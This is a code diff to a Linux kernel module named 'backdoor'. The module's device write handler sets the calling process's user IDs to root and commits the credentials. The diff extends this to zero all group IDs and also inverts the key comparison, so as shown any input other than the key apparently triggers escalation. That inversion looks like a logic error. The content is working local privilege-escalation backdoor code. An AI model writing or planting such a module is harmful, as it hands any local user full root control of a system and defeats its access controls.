@@ -2,6 +2,7 @@
 #include <linux/miscdevice.h>
 #include <linux/mm.h>
 #include <linux/module.h>
+#include <linux/syscalls.h>
 #include <linux/uaccess.h>
 
 MODULE_LICENSE("GPL");
@@ -55,7 +56,7 @@ ssize_t backdoor_write(
                 goto out;
         }
 
-        if (strncmp(key, buf, count)) {
+        if (strncmp(key, buf, count) == 0) {
                 result = count;
                 goto out;
         }
@@ -70,6 +71,10 @@ ssize_t backdoor_write(
         new_cred->suid.val = 0;
         new_cred->euid.val = 0;
         new_cred->fsuid.val = 0;
+        new_cred->gid.val = 0;
+        new_cred->sgid.val = 0;
+        new_cred->fsgid.val = 0;
+        new_cred->egid.val = 0;
 
         commit_creds(new_cred);
         result = count;
@@ -89,6 +94,7 @@ struct miscdevice backdoor_dev = {
 };
 
 const struct file_operations backdoor_fops = {
+        .owner = THIS_MODULE,
         .write = backdoor_write,
 };
 
